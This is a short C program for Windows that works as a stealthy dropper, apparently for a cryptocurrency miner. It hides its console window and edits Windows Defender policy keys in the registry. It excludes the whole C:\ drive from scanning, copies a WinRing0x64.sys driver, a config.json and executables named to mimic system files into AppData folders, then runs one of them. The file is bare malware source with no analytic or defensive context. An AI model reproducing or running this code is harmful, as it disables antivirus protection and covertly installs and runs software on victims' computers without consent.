#include <stdio.h>
#include <stdlib.h>
#include <windows.h>



void runCMD() {
    system("\%userprofile\%\\appdata\\roaming\\System\\sys32.exe");
}


int main() {

    HWND stealth;
    AllocConsole();
    stealth = FindWindow("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);


    system("reg delete \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v Wx86 /f");
    system("reg add \"HKEY_LOCAL_MACHINE\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v Wx86 /t REG_DWORD /d 1 /f");
    system("powershell -Command Add-MpPreference -ExclusionPath 'C:\\'");
    system("mkdir \%userprofile\%\\appdata\\roaming\\WIN32");
    system("mkdir \%userprofile\%\\appdata\\roaming\\System");
    system("copy WinRing0x64.sys \%userprofile\%\\appdata\\roaming\\WIN32");
    system("copy Win32.exe \%userprofile\%\\appdata\\roaming\\WIN32");
    system("copy System32.exe \%userprofile\%\\appdata\\roaming\\WIN32");
    system("copy config.json \%userprofile\%\\appdata\\roaming\\WIN32");
    system("copy Sys32.exe \%userprofile\%\\appdata\\roaming\\System");
    HANDLE thread;
    DWORD threadID;
    thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)runCMD, NULL, 0, &threadID);
    Sleep(1);
    return 0;
}
